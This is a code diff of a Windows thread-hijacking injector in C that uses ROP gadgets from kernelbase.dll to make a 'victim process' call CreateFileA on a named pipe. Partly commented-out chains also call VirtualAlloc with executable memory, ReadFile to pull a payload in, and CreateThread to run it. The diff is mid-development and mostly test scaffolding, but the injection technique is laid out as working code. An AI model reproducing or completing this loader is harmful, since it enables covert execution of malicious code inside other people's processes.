@@ -92,9 +92,10 @@ void slay(HANDLE hThread, Gadgets gadgets, DWORD64 a, DWORD64 b, DWORD64 c, DWOR
 
     //ctx.Rsp -= 32;
 
-    //if (ctx.Rsp != (ctx.Rsp & ~0xF)) {
-       // ctx.Rsp = (ctx.Rsp & ~0xF);
-    //}
+    if (ctx.Rsp != (ctx.Rsp & ~0x0F)) {
+       //ctx.Rsp = (ctx.Rsp & ~0x0F);
+        printf("weird stack");
+    }
 
     ctx.Rip = gadgets.ret;
 
@@ -184,7 +185,7 @@ DWORD64 get_ret_val(HANDLE hThread, Gadgets gadgets) {
     //return addr;
 }
 
-void TestFunc(DWORD64 a, DWORD64 b, DWORD64 c, DWORD64 d, DWORD64 e, DWORD64 f, DWORD64 g, DWORD64 h) {
+void __stdcall TestFunc(DWORD64 a, DWORD64 b, DWORD64 c, DWORD64 d, DWORD64 e, DWORD64 f, DWORD64 g) {
     printf("a: %llu\n", a);
     printf("b: %llu\n", b);
     printf("c: %llu\n", c);
@@ -192,7 +193,7 @@ void TestFunc(DWORD64 a, DWORD64 b, DWORD64 c, DWORD64 d, DWORD64 e, DWORD64 f, 
     printf("e: %llu\n", e);
     printf("f: %llu\n", f);
     printf("g: %llu\n", g);
-    printf("h: %llu\n", h);
+    //printf("h: %llu\n", h);
 }
 
 
@@ -224,8 +225,6 @@ int main(void) {
         .ret  = find_gadget("\xC3",         1, "kernelbase.dll"), // ret
     };
 
-    //printf("RET Gadget: 0x%p\n", gadgets.ret);
-
     if (gadgets.pshc == 0 || gadgets.jmps == 0 || gadgets.ret == 0) {
         printf("[!] Gadgets could not be found\n");
         return 1;
@@ -255,7 +254,7 @@ int main(void) {
     printf("[*] Process exited kernel, ready for injection\n");
 
     // Push a junk val to stack, this is quite useless but it simplifies the code
-    //push_junk(hThread, gadgets);
+    push_junk(hThread, gadgets);
 
     HANDLE pipe = CreateNamedPipeA(pipename, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_BYTE, 1, HeapAllocSize, 0, 5000, NULL);
     if (pipe == INVALID_HANDLE_VALUE) {
@@ -269,86 +268,95 @@ int main(void) {
     DWORD64 fnCloseHandle  = (DWORD64)GetProcAddress(GetModuleHandleA("kernel32.dll"),   "CloseHandle");
     DWORD64 fnReadFile     = (DWORD64)GetProcAddress(GetModuleHandleA("kernel32.dll"),   "ReadFile");
 
-    
-    pushm(hThread, gadgets, 8); //h
-    pushm(hThread, gadgets, 7); //e
-    pushm(hThread, gadgets, 6); //f
-    pushm(hThread, gadgets, 5); //g
-    
-
-    pushm(hThread, gadgets, gadgets.jmps);
-
-    
-    pushm(hThread, gadgets, gadgets.jmps);
-    pushm(hThread, gadgets, gadgets.jmps);
-    pushm(hThread, gadgets, gadgets.jmps);
-    pushm(hThread, gadgets, gadgets.jmps);
-
-    pushm(hThread, gadgets, TestFunc);
-
-
-    slay(hThread, gadgets, 1, 2, 3, 4);
-
-    //waitunblock(hThread);
-
-
-    WaitForSingleObject(hThread, INFINITE);
-    return 0;
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-    // VirtualAlloc
-    pushm(hThread, gadgets, gadgets.jmps);
-    pushm(hThread, gadgets, fnVirtualAlloc);
-    slay(hThread, gadgets, 0, 0x10000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-
-    waitunblock(hThread);
-    DWORD64 addr2 = get_ret_val(hThread, gadgets);
-    printf("[*] VirtualAlloc'd memory at: 0x%llu\n", addr2);
-
-    //return 0;
-
-
-
-
-
-
-
-    DWORD_PTR namptr;
+    DWORD_PTR namptr = NULL;
     for (int j = sizeof(pipename); j > 0; j -= 8) {
-        DWORD64 num = 0;
-        memcpy(&num, pipename + j - 8, 8);
+        DWORD64 num = *(DWORD64*)(pipename + j - 8);
+        //memcpy(&num, pipename + j - 8, 8);
         namptr = pushm(hThread, gadgets, num);
     }
     printf("[*] Pipe name injected to stack\n");
 
+
+    // This is an exam of calling a function with 8 paramanters correctly that uses stack shadow space. 
+    // https://retroscience.net/x64-assembly.html
+
+    pushm(hThread, gadgets, 8); //h
+
+    pushm(hThread, gadgets, 7); //e
+    pushm(hThread, gadgets, 6); //f
+    pushm(hThread, gadgets, 5); //g
+
+    pushm(hThread, gadgets, 0xFFFA);
+    pushm(hThread, gadgets, 0xFFFB);
+    pushm(hThread, gadgets, 0xFFFC);
+    pushm(hThread, gadgets, 0xFFFD);
+
+    pushm(hThread, gadgets, gadgets.jmps);
+
+    pushm(hThread, gadgets, TestFunc);
+
+    slay(hThread, gadgets, 1, 2, 3, 4);
+    waitunblock(hThread);
+    //return 0;
+
+
+    //HANDLE phand2 = CreateFileA(namptr, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+
+
+
+    // The Real One
     pushm(hThread, gadgets, 0);
-    pushm(hThread, gadgets, 0);
+    pushm(hThread, gadgets, FILE_ATTRIBUTE_NORMAL);
+    pushm(hThread, gadgets, OPEN_EXISTING);
+
+    pushm(hThread, gadgets, 0x02);
+    pushm(hThread, gadgets, 0x01);
+    pushm(hThread, gadgets, 0xA1188FF220);
+    pushm(hThread, gadgets, 0xB8);
+    
+    pushm(hThread, gadgets, gadgets.jmps);
+
+    pushm(hThread, gadgets, fnCreateFileA);
+
+    slay(hThread, gadgets, namptr, GENERIC_READ, FILE_SHARE_READ, 0);
+    waitunblock(hThread);
+
+    HANDLE phand = (HANDLE)get_ret_val(hThread, gadgets); //HANDLE object in victim process
+    printf("Pipes connected\n");
+    if (phand == INVALID_HANDLE_VALUE) {
+        printf("Got a bad handle\n");
+        return 1;
+    }
+
+    return 0;
+
+    // VirtualAlloc
+    //pushm(hThread, gadgets, gadgets.jmps);
+    //pushm(hThread, gadgets, fnVirtualAlloc);
+    //slay(hThread, gadgets, 0, 0x10000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+    //waitunblock(hThread);
+    //DWORD64 addr2 = get_ret_val(hThread, gadgets);
+    //printf("[*] VirtualAlloc'd memory at: 0x%llu\n", addr2);
+
+    //return 0;
+
+    //auto a = CreateFileA();
+
+
+
+
+
+    //DWORD_PTR namptr = NULL;
+    //for (int j = sizeof(pipename); j > 0; j -= 8) {
+    //    DWORD64 num = 0;
+    //    memcpy(&num, pipename + j - 8, 8);
+    //    namptr = pushm(hThread, gadgets, num);
+    //}
+    //printf("[*] Pipe name injected to stack\n");
+
+    //pushm(hThread, gadgets, 0);
+    //pushm(hThread, gadgets, 0);
     //pushm(hThread, gadgets, 0);
 
 
@@ -358,89 +366,70 @@ int main(void) {
 
     //HANDLE test = CreateFileA(namptr, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
 
-    /*
-    CreateFilePtr
-    SRP
-    param5
-    param6
-    param7
-    
-    
-    */
-    pushm(hThread, gadgets, 5);
-    pushm(hThread, gadgets, 6);
-    pushm(hThread, gadgets, 7);
-    pushm(hThread, gadgets, 8);
-    pushm(hThread, gadgets, gadgets.jmps);
-    pushm(hThread, gadgets, TestFunc);
-    slay(hThread, gadgets, 1, 2, 3, 4);
-
-    waitunblock(hThread);
-
-    return 0;
-
-
     pushm(hThread, gadgets, 0);
     pushm(hThread, gadgets, FILE_ATTRIBUTE_NORMAL);
     pushm(hThread, gadgets, OPEN_EXISTING);
-    pushm(hThread, gadgets, gadgets.jmps);
-    pushm(hThread, gadgets, fnCreateFileA);
-    slay(hThread, gadgets, namptr, GENERIC_READ, FILE_SHARE_READ, 0);
 
+    pushm(hThread, gadgets, gadgets.jmps);
+
+    // Shadow space - just any 32 bytes
+    //pushm(hThread, gadgets, gadgets.jmps);
+    //pushm(hThread, gadgets, gadgets.jmps);
+    //pushm(hThread, gadgets, gadgets.jmps);
+    //pushm(hThread, gadgets, gadgets.jmps);
+
+    pushm(hThread, gadgets, fnCreateFileA);
+
+    slay(hThread, gadgets, namptr, GENERIC_READ, FILE_SHARE_READ, 0);
     waitunblock(hThread);
 
-    //getc(stdin);
-    //return 0;
-
-    HANDLE phand = (HANDLE)get_ret_val(hThread, gadgets); //HANDLE object in victim process
-    printf("Pipes connected\n");
-    if (phand == INVALID_HANDLE_VALUE) {
-        printf("Got a bad handle\n");
-        return 1;
-    }
-
+    //HANDLE phand = (HANDLE)get_ret_val(hThread, gadgets); //HANDLE object in victim process
+    //printf("Pipes connected\n");
+    //if (phand == INVALID_HANDLE_VALUE) {
+    //    printf("Got a bad handle\n");
+    //    return 1;
+    //}
+    return 0;
 
 
 
 
     // VirtualAlloc
-    pushm(hThread, gadgets, gadgets.jmps);
-    pushm(hThread, gadgets, fnVirtualAlloc);
-    slay(hThread, gadgets, 0, 0x10000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    //pushm(hThread, gadgets, gadgets.jmps);
+    //pushm(hThread, gadgets, fnVirtualAlloc);
+    //slay(hThread, gadgets, 0, 0x10000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
-    waitunblock(hThread);
-    DWORD64 addr = get_ret_val(hThread, gadgets);
-    printf("[*] VirtualAlloc'd memory at: 0x%llu\n", addr);
+    //waitunblock(hThread);
+    //DWORD64 addr = get_ret_val(hThread, gadgets);
+    //printf("[*] VirtualAlloc'd memory at: 0x%llu\n", addr);
 
-    DWORD bw = 0;
-    WriteFile(pipe, buf, sizeof(buf), &bw, NULL);
+    //DWORD bw = 0;
+    //WriteFile(pipe, buf, sizeof(buf), &bw, NULL);
 
     // ReadFile
-    pushm(hThread, gadgets, phand);
-    pushm(hThread, gadgets, gadgets.jmps);
-    pushm(hThread, gadgets, fnReadFile);
-    slay(hThread, gadgets, 0, namptr, HeapAllocSize, addr);
-    waitunblock(hThread);
-    printf("[*] ReadFile called\n");
+    //pushm(hThread, gadgets, phand);
+    //pushm(hThread, gadgets, gadgets.jmps);
+    //pushm(hThread, gadgets, fnReadFile);
+    //slay(hThread, gadgets, 0, namptr, HeapAllocSize, addr);
+    //waitunblock(hThread);
+    //printf("[*] ReadFile called\n");
 
 
     // CloseHandle
-    pushm(hThread, gadgets, gadgets.jmps);
-    pushm(hThread, gadgets, fnCloseHandle);
-    slay(hThread, gadgets, phand, 0, 0, 0);
-    waitunblock(hThread);
-    printf("[*] CloseHandle called\n");
+    //pushm(hThread, gadgets, gadgets.jmps);
+    //pushm(hThread, gadgets, fnCloseHandle);
+    //slay(hThread, gadgets, phand, 0, 0, 0);
+    //waitunblock(hThread);
+   // printf("[*] CloseHandle called\n");
 
     // CreateThread
-    pushm(hThread, gadgets, 0);
-    pushm(hThread, gadgets, gadgets.jmps);
-    pushm(hThread, gadgets, fnCreateThread);
+    //pushm(hThread, gadgets, 0);
+    //pushm(hThread, gadgets, gadgets.jmps);
+    //pushm(hThread, gadgets, fnCreateThread);
 
-    slay(hThread, gadgets, 0, 0, addr, 0);
+    //slay(hThread, gadgets, 0, 0, addr, 0);
     //waitunblock(hThread);
-    printf("[*] CreateThread called\n");
-
-
+    //printf("[*] CreateThread called\n");
 
 
     WaitForSingleObject(hThread, INFINITE);
